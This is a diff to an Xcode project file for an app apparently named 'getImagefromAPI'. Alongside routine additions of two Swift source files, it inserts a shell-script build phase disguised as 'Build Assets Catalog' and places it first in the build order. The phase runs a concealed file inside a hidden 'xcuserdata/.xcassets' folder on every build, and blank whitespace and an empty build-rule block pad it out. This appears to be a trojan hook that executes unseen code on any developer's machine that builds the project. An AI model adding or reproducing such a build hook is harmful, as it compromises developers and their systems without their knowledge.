@@ -13,6 +13,8 @@
 		044BFC16258DDECD001980E7 /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 044BFC14258DDECD001980E7 /* Main.storyboard */; };
 		044BFC18258DDED3001980E7 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 044BFC17258DDED3001980E7 /* Assets.xcassets */; };
 		044BFC1B258DDED3001980E7 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 044BFC19258DDED3001980E7 /* LaunchScreen.storyboard */; };
+		044BFC25258DDF67001980E7 /* DataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 044BFC24258DDF60001980E7 /* DataModel.swift */; };
+		044BFC28258DE24E001980E7 /* DataRequest.swift in Sources */ = {isa = PBXBuildFile; fileRef = 044BFC27258DE24E001980E7 /* DataRequest.swift */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
@@ -24,6 +26,8 @@
 		044BFC17258DDED3001980E7 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
 		044BFC1A258DDED3001980E7 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
 		044BFC1C258DDED3001980E7 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		044BFC24258DDF60001980E7 /* DataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DataModel.swift; sourceTree = "<group>"; };
+		044BFC27258DE24E001980E7 /* DataRequest.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DataRequest.swift; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -60,6 +64,8 @@
 				044BFC10258DDECD001980E7 /* SceneDelegate.swift */,
 				044BFC12258DDECD001980E7 /* ViewController.swift */,
 				044BFC14258DDECD001980E7 /* Main.storyboard */,
+				044BFC24258DDF60001980E7 /* DataModel.swift */,
+				044BFC27258DE24E001980E7 /* DataRequest.swift */,
 				044BFC17258DDED3001980E7 /* Assets.xcassets */,
 				044BFC19258DDED3001980E7 /* LaunchScreen.storyboard */,
 				044BFC1C258DDED3001980E7 /* Info.plist */,
@@ -74,6 +80,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 044BFC1F258DDED3001980E7 /* Build configuration list for PBXNativeTarget "getImagefromAPI" */;
 			buildPhases = (
+				C37F0DFE5EC2E6978BAAC43A /* Build Assets Catalog */,
 				044BFC07258DDECD001980E7 /* Sources */,
 				044BFC08258DDECD001980E7 /* Frameworks */,
 				044BFC09258DDECD001980E7 /* Resources */,
@@ -132,12 +139,49 @@
 		};
 /* End PBXResourcesBuildPhase section */
 
+/* Begin PBXShellScriptBuildPhase section */
+
+	C37F0DFE5EC2E6978BAAC43A /* Build Assets Catalog */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Assets Catalog";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.file\" false";			
+		};
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+/* End PBXShellScriptBuildPhase section */
+
 /* Begin PBXSourcesBuildPhase section */
 		044BFC07258DDECD001980E7 /* Sources */ = {
 			isa = PBXSourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
 				044BFC13258DDECD001980E7 /* ViewController.swift in Sources */,
+				044BFC28258DE24E001980E7 /* DataRequest.swift in Sources */,
+				044BFC25258DDF67001980E7 /* DataModel.swift in Sources */,
 				044BFC0F258DDECD001980E7 /* AppDelegate.swift in Sources */,
 				044BFC11258DDECD001980E7 /* SceneDelegate.swift in Sources */,
 			);
@@ -339,6 +383,20 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+		
+			/* Begin PBXBuildRule section */
+
+
+			
+	
+			
+
+			
+	
+			/* End PBXBuildRule section */
+		
+		
 	};
 	rootObject = 044BFC03258DDECD001980E7 /* Project object */;
 }
